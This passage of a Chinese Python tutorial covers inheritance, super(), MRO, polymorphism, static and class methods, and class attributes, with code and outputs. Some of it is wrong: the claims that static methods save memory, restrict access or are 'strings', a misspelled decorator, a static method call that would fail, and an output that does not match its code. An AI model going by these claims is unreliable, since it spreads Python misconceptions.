class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>的年龄是: <span class="subst">&#123;self.age&#125;</span>, 学历是: <span class="subst">&#123;self.collage&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GrandChild</span>(<span class="title class_ inherited__">Son</span>):</span><br><span class="line">    <span class="comment"># 一个类在实例化的过程中会自动调用__init__方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name,  age,  collage, *args,**kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name,  age,  collage)</span><br><span class="line">        self.address = args[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前子类需要完成的其他事情...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>的年龄是: <span class="subst">&#123;self.age&#125;</span>, 学历是: <span class="subst">&#123;self.collage&#125;</span>，地址是：<span class="subst">&#123;self.address&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">father = Father(<span class="string">&#x27;父亲&#x27;</span>, <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(father)</span><br><span class="line"></span><br><span class="line">son = Son(<span class="string">&#x27;儿子&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;大学&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(son)</span><br><span class="line"></span><br><span class="line">grand_child = GrandChild(<span class="string">&#x27;孙子&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;未上学&#x27;</span>, <span class="string">&#x27;长沙&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(grand_child)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">父亲的年龄是: 50</span><br><span class="line">儿子的年龄是: 19, 学历是: 大学</span><br><span class="line">当前子类需要完成的其他事情...</span><br><span class="line">孙子的年龄是: 2, 学历是: 未上学，地址是：长沙</span><br></pre></td></tr></table></figure><h2 id="简单总结-1"><a href="#简单总结-1" class="headerlink" title="简单总结"></a>简单总结</h2><blockquote><p>如果想要在子类方法中调用被重写的父类方法就可以使用<code>super().父类方法名()</code></p></blockquote><h2 id="如果继承多个父类，super指的是哪一个父类呢？"><a href="#如果继承多个父类，super指的是哪一个父类呢？" class="headerlink" title="如果继承多个父类，super指的是哪一个父类呢？"></a>如果继承多个父类，super指的是哪一个父类呢？</h2><blockquote><p>可以用类对象的方法查看继承的过程</p><blockquote><p><a href="https://blog.csdn.net/yusuiyu/article/details/88061508">Python 魔法方法（六） 从<code>__mro__</code> 了解类多继承顺序和原理_yusuiyu的博客-CSDN博客</a></p></blockquote><p><code>__mro__</code>：</p><p>python 类有多继承特性，如果继承关系太复杂，很难看出会先调用那个属性或方法。</p><p>为了方便且快速地看清继承关系和顺序，可以用<code>__mro__</code>方法来获取这个类的调用顺序。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>(<span class="title class_ inherited__">object</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Y</span>(<span class="title class_ inherited__">object</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(X, Y): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">Y</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(A, B): <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(C.__mro__)</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>在本类上一级的类就是suepr指向的类~~~</p><p>如运行结果中：A类就是C类的super类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.C&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.A&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.X&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.Y&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure></blockquote><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><h2 id="面向对象的特征"><a href="#面向对象的特征" class="headerlink" title="面向对象的特征"></a>面向对象的特征</h2><p>说明</p><p>面向对象编程有3个特征：</p><ul><li>封装</li><li>继承</li><li>多态</li></ul><p>封装与继承之前我们已经研究过了，本节课研究<code>多态</code></p><h2 id="多态的概念"><a href="#多态的概念" class="headerlink" title="多态的概念"></a>多态的概念</h2><p>多态从字面意思来看，就是多种形态的意思。</p><p>在python中它的实际功能是：</p><blockquote><ul><li><p>如果一个<strong>变量存储了某一个实例对象的引用</strong>，且通过这个变量调用指向的对象中的某个方法，此时如果变量指向的对象是子类创建的那么就调用子类中的方法，如果是父类创建的对象那么就调用父类的方法</p></li><li><p>简而言之：在Python中，多态就是同一个方法产生不同的效果即为多态。多态现象的出现实际上就是<strong>继承类方法</strong>和<strong>重写类方法</strong>产生的现象</p></li></ul></blockquote><p>多态更加官方一点的学术解释便是：</p><blockquote><p>python面向对象的多态依赖于继承, 因为继承，使得子类拥有了父类的方法, 子类的方法与父类方法重名时是重写, 同一类事物，有多重形态, 这就是面向对象概念里的多态，多态使得不同的子类对象调用相同的 类方法，产生不同的执行结果，可以增加代码的外部调用灵活度。</p></blockquote><h2 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bark</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;狗汪汪叫...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangDog</span>(<span class="title class_ inherited__">Dog</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bark</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;狼狗震耳欲聋的叫...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZangAo</span>(<span class="title class_ inherited__">Dog</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pk_dog</span>(<span class="params">self, dog</span>):</span><br><span class="line">        <span class="comment">#这个地方方法传递的参数是dog对象的引用</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;人用力的向狗进行了攻击...&quot;</span>)</span><br><span class="line">        dog.bark()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">anna = Person()</span><br><span class="line">dog1 = Dog()</span><br><span class="line">dog2 = LangDog()</span><br><span class="line">dog3 = ZangAo()</span><br><span class="line"></span><br><span class="line">anna.pk_dog(dog1)</span><br><span class="line">anna.pk_dog(dog2)</span><br><span class="line">anna.pk_dog(dog3)</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">人 用力的向狗进行了攻击...</span><br><span class="line">狗汪汪叫...</span><br><span class="line">人 用力的向狗进行了攻击...</span><br><span class="line">狼狗震耳欲聋的叫...</span><br><span class="line">人 用力的向狗进行了攻击...</span><br><span class="line">狗汪汪叫...</span><br></pre></td></tr></table></figure><h2 id="简单总结-2"><a href="#简单总结-2" class="headerlink" title="简单总结"></a>简单总结</h2><p>想要实现多态，需要的条件如下：</p><ol><li>有继承</li><li>有重写</li></ol><h1 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h1><h2 id="引入-6"><a href="#引入-6" class="headerlink" title="引入"></a>引入</h2><p>默认情况下，python类中定义的方法是实例方法，即这个方法有一个默认的形参<code>self</code>，这个<code>self</code>会在方法被调用的时候指向对象</p><p>但是有些时候，我们并不需要对象的引用，即<code>self</code>没用，那该怎么处理呢？能不写<code>self</code>吗？</p><p>答：可以</p><h2 id="静态方法的概念"><a href="#静态方法的概念" class="headerlink" title="静态方法的概念"></a>静态方法的概念</h2><p>如果一个方法不写<code>self</code>即不需要实例对象的引用，此时在定义方法的时候可以用<code>@staticmethod</code>对函数进行修饰，被修饰的函数就可以不写<code>self</code></p><p>一句话：被<code>@staticmethod</code>修饰的方法，就是<code>静态方法</code></p><h2 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Calculator</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算器类&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 定义2个默认值</span></span><br><span class="line">        self.num1 = <span class="number">0</span></span><br><span class="line">        self.num2 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_menu</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;因为打印菜单功能方法并不需要self指向的对象，所以就考虑使用静态方法&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;    双双牌计算机 V2022.10&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1. 加法&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;2. 减法&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;3. 乘法&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;4. 除法&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;5. 退出&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_nums</span>(<span class="params">self</span>):</span><br><span class="line">        self.num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入第1个数:&quot;</span>))</span><br><span class="line">        self.num2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入第2个数:&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.num1 + self.num2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">min</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.num1 - self.num2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.num1 * self.num2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.num1 / self.num2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.show_menu()</span><br><span class="line">            op = <span class="built_in">input</span>(<span class="string">&quot;请输入要进行的操作:&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">                self.get_nums()</span><br><span class="line">                self.add()</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">                self.get_nums()</span><br><span class="line">                self.<span class="built_in">min</span>()</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">                self.get_nums()</span><br><span class="line">                self.mul()</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">                self.get_nums()</span><br><span class="line">                self.div()</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;5&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个计算器对象</span></span><br><span class="line">cal = Calculator()</span><br><span class="line"><span class="comment"># 调用计算器的运行方法</span></span><br><span class="line">cal.run()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">发现这个静态方法可以使用实例对象或者类对象进行调用</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">所谓的静态方法是没有self参数的</span></span><br><span class="line"><span class="string">    静态方法无法访问实例属性</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">静态方法有什么用？</span></span><br><span class="line"><span class="string">    静态方法的位置在哪里？</span></span><br><span class="line"><span class="string">        类的内部！</span></span><br><span class="line"><span class="string">        这个静态方法的作用域在这个类中</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        确定作用域的</span></span><br><span class="line"><span class="string">            本质上静态方法和我们之前所学的函数基本是一致的</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            只是当前这个函数的作用域在这个类中</span></span><br><span class="line"><span class="string">                必须通过这个类才能调用这个静态方法</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">    双双牌计算机 V2022.10</span><br><span class="line">1. 加法</span><br><span class="line">2. 减法</span><br><span class="line">3. 乘法</span><br><span class="line">4. 除法</span><br><span class="line">5. 退出</span><br><span class="line">请输入要进行的操作:</span><br></pre></td></tr></table></figure><h2 id="简单总结-3"><a href="#简单总结-3" class="headerlink" title="简单总结"></a>简单总结</h2><blockquote><ul><li>如果不需要用到对象，那么就可以将方法用<code>@staticmethod</code>进行修饰，如此一来此方法就变成了静态方法。</li><li>除了实例对象可以调用静态方法，类对象也可以调用静态方法</li><li>静态方法不能访问实例属性和类属性，只是一个在类中的普通函数</li></ul></blockquote><h2 id="静态方法的作用"><a href="#静态方法的作用" class="headerlink" title="静态方法的作用"></a>静态方法的作用</h2><blockquote><p>为什么实例方法都可以做，但是还是需要静态方法呢？</p></blockquote><ol><li><p><strong>优化内存：</strong>因为实例方法会使用到一些属性，尤其是self，相较于实例方法，静态方法更加节省内存~~如果想优化自己的程序就可以使用静态方法</p></li><li><p><strong>限定权限：</strong>另外某些时候，我们想要某些特定的类可以使用特定的方法，而不允许其他的类使用的话，我们也可以使用静态方法定义该方法~~</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#此时Test_1和Test_2都可以调用test()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test_1</span>:</span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test_2</span>:</span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时Test_1可以，，Test_2不行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test_1</span>:</span><br><span class="line"><span class="meta">    @staticmathod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test_2</span>:</span><br><span class="line">    <span class="comment">#无法调用test()</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h1><h2 id="引入-7"><a href="#引入-7" class="headerlink" title="引入"></a>引入</h2><p>默认情况下 ，当通过同一个类创建了多个实例对象之后，每个实例对象之间是相互隔离的</p><p>但是有时候有些数据需要在多个对象之间共享，此时该怎么办呢？</p><p>答：类属性</p><h2 id="类属性的概念"><a href="#类属性的概念" class="headerlink" title="类属性的概念"></a>类属性的概念</h2><p>想要在多个对象之间共享数据，即一些属性需要在<code>多个对象</code>之间<code>共享</code>，这样的<code>属性</code>就是<code>类属性</code></p><p>那怎样定义类属性呢？格式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>:</span><br><span class="line">    类属性 = ....</span><br></pre></td></tr></table></figure><p>即在<code>class</code>内且在<code>def</code>之外定义的变量，就叫做<code>类属性</code></p><h2 id="代码示例-4"><a href="#代码示例-4" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tool</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    tools_num = <span class="number">0</span>  <span class="comment"># 定义一个类属性，用来存储共享的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        Tool.tools_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;工具的总数为：&quot;</span>, self.tools_num)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info2</span>(<span class="params">self</span>):  <span class="comment"># 如果在静态方法中写入了self参数 当前这个self参数没有任何意义 就是一个普通的形参</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;工具的总数为：&quot;</span>, Tool.tools_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tieqiao = Tool(<span class="string">&quot;铁锹&quot;</span>)</span><br><span class="line">chutou = Tool(<span class="string">&quot;锄头&quot;</span>)</span><br><span class="line">dianciluo = Tool(<span class="string">&quot;电磁炉&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;工具的总数为：&quot;</span>, Tool.tools_num)  <span class="comment"># 可以直接通过 类名.类属性操作</span></span><br><span class="line">tieqiao.print_info()  <span class="comment"># 可以通过Tool创建的任意实例对象调用方法，在方法中获取</span></span><br><span class="line"></span><br><span class="line">Tool.print_info2()</span><br></pre></td></tr></table></figure><h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><p>先看案例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="comment"># 类属性</span></span><br><span class="line">    nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_nums_1</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.nums)  <span class="comment"># 如果在这个类中声明类属性与实例属性并且同名 则实例方法访问的是实例属性</span></span><br><span class="line">        <span class="comment"># print(Test.nums)</span></span><br><span class="line">        <span class="comment"># print(nums)</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        如果在实例方法中访问的属性名在实例属性中存在 则直接访问实例属性</span></span><br><span class="line"><span class="string">        如果访问的属性在实例属性中不存在 则会继续向上寻找 类属性</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod  </span><span class="comment"># 类方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_nums_2</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(cls.nums)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = Test()</span><br><span class="line">test.print_nums_1()</span><br><span class="line">test.print_nums_2()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">类属性是一种共享的属性</span></span><br><span class="line"><span class="string">    多个方法都可以对当前这个类属性进行操作</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><ol><li>如果在实例方法中访问的属性名在实例属性中存在则直接访问实例属性。如果访问的属性在实例属性中不存在 则会继续向上寻找类属性</li><li>类属性是一种共享的属性。多个方法都可以对当前这个类属性进行操作</li><li>类属性可以直接使用类对象调用~~</li><li>类属性可以被类方法使用，就跟实例属性可以被实例方法使用一样的道理~~~</li><li>另外，类属性存储在类对象中，实例属性存储在实例对象之中，实例对象的存储空间是相互隔离的，但类对象只有一个，只会在内存中保存一份</li></ol></blockquote><h1 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h1><h2 id="引入-8"><a href="#引入-8" class="headerlink" title="引入"></a>引入</h2><blockquote><p>为了更好的对<code>类属性</code>进行操作，Python中提供了另外一种方法<code>类方法</code></p></blockquote><h2 id="类方法的概念"><a href="#类方法的概念" class="headerlink" title="类方法的概念"></a>类方法的概念</h2><p>之前在学习<code>静态方法</code>的时候我们知道可以在方法的名字前面添加<code>@staticmethod</code>此时这个方法就是静态方法，</p><p>与这种添加<code>@</code>的方式很类似，如果想要让一个方法成为<code>类方法</code>我们只需要在这个方法的前面添加<code>@classmethod</code>即可，与此同时需要在方法的第1个形参位置添加<code>cls</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>:</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">类方法名</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tool</span>:</span><br><span class="line">    tools_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="comment"># 在构造方法中对类属性进行加法操作</span></span><br><span class="line">        Tool.tools_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;工具总数为: <span class="subst">&#123;self.tools_num&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info_</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;工具总数为: <span class="subst">&#123;cls.tools_num&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tieqiao = Tool(<span class="string">&#x27;铁锹&#x27;</span>)</span><br><span class="line">chutou = Tool(<span class="string">&#x27;chutou&#x27;</span>)</span><br><span class="line">xiyiji = Tool(<span class="string">&#x27;洗衣机&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过实例对象访问类属性</span></span><br><span class="line"><span class="comment"># xiyiji.print_info()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 通过类对象的方式进行类属性的访问</span></span><br><span class="line"><span class="comment"># Tool.print_info_()</span></span><br><span class="line"></span><br><span class="line">tieqiao.print_info()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">工具的总数为： 3</span><br></pre></td></tr></table></figure><h2 id="简单总结-4"><a href="#简单总结-4" class="headerlink" title="简单总结"></a>简单总结</h2><blockquote><ol><li>定义类方法时，前面添加<code>@classmethod</code></li><li>类方法的第1个形参，一般都叫做<code>cls</code>（当然了叫什么名字可以任意，但一般都用<code>cls</code>）,cls就是类对象本身，实际上就是类的名字</li><li>调用类方法的时候，可以用<code>实例对象</code>、<code>类对象</code>调用，但无论用哪种方式调用，类方法中的<code>cls</code>指向类对象</li><li>需要注意：类方法没有权限访问实例属性（为什么没有权限呢，因为传入的是cls而不是self~~~）</li></ol></blockquote><h2 id="关于静态方法、类属性、类方法的小结"><a href="#关于静态方法、类属性、类方法的小结" class="headerlink" title="关于静态方法、类属性、类方法的小结"></a>关于静态方法、类属性、类方法的小结</h2><blockquote><ul><li><p>静态方法:如果一个方法中无需访问任何属性则可以使用静态方法</p></li><li><p>类属性: 如果想要让这个属性给多个方法使用，则可以使用类属性</p></li><li><p>类方法:    如果一个方法无需访问实例属性但需要访问类属性则可以使用类方法</p></li></ul></blockquote><h1 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h1><h2 id="引入-9"><a href="#引入-9" class="headerlink" title="引入"></a>引入</h2><p>之前在学习类属性的时候，我们提到过：类属性是可以在多个实例对象之间共享的属性</p><p>那么问题来了，类属性到底存在哪里呢？</p><p>答：类对象</p><h2 id="类对象的概念"><a href="#类对象的概念" class="headerlink" title="类对象的概念"></a>类对象的概念</h2><p>之前我们说到通过<code>class</code>定义的就是类（就是一个要创建的商品的模板），通过<code>类名()</code>创建出来的叫做<code>实例对象</code></p><p>其实，定义的类（即用<code>class</code>定义的类）实际上也是一个对象（试想即使我们把 类称之为模板，模板也不是空的啊，也是需要占用内存的对吗）</p><p>定义的类其实就是一个对象，为了能够将这个对象与其创建出来的实例对象进行区分，将这个class定义的类叫做<code>类对象</code></p><h2 id="Python本质：万物皆对象"><a href="#Python本质：万物皆对象" class="headerlink" title="Python本质：万物皆对象"></a>Python本质：万物皆对象</h2><blockquote><p>实际上Python基本上都是对象，字符串也是一个对象，在Python中万物皆是对象，</p><blockquote><p>变量</p><p>字符串</p><p>代码（在python中有代码类型）</p><p>文件</p><p>io</p><p>……</p></blockquote><p>上述这些都是对象</p><p>而对象的本质就是一个字符串~~（对象太过字符串存储在内存中）</p></blockquote><h2 id="类对象的作用"><a href="#类对象的作用" class="headerlink" title="类对象的作用"></a>类对象的作用</h2><p>我们知道实例对象是类 （即类对象）创建出来的，所以类对象对于实例对象而言是共享的，既然是共享的那么就干脆将实例对象都有的而且不变化的内容存储到 类对象 即可，这样会减少内容的占用</p><p>那，哪些东西在类对象中存储呢？</p><ul><li>类属性</li><li>所有的方法</li></ul><p>对你没有看错，除了熟知的类属性之外，类对象中存储了<code>class</code>定义的所有的方法（无论是魔法方法、实例方法、静态方法 、类方法都在类对象中存储），因为方法(即函数)的代码是不变的，变化的仅仅是数据而已。</p><h2 id="实例对象怎么用类对象"><a href="#实例对象怎么用类对象" class="headerlink" title="实例对象怎么用类对象"></a>实例对象怎么用类对象</h2><p>每个实例对象中都会有1个额外默认的属性<code>__class__</code>，这个属性指向了创建当前对象的模板即类对象，所以当调用<code>实例对象.xxx()</code>时，实际上<code>实例对象.__class__.xxx()</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">因为类属性和类方法都存储在类对象中</span></span><br><span class="line"><span class="string">    实例属性想要使用类属性/类方法 则需要找到这个类所存储的空间</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(cls.nums)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个实例对象</span></span><br><span class="line">test = Test()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">现在说明实例访问类属性与类方法的过程</span></span><br><span class="line"><span class="string">    1. 创建实例对象</span></span><br><span class="line"><span class="string">    2. 在创建的实例对象中存在一个方法 __class__</span></span><br><span class="line"><span class="string">    3. 通过__class__底层方法获取到这个类的地址</span></span><br><span class="line"><span class="string">    4. 通过地址找到对应的方法与属性</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例对象通过__class__获取这个类的地址 通过这个地址获取这个类所保存的类属性与方法</span></span><br><span class="line"><span class="comment"># 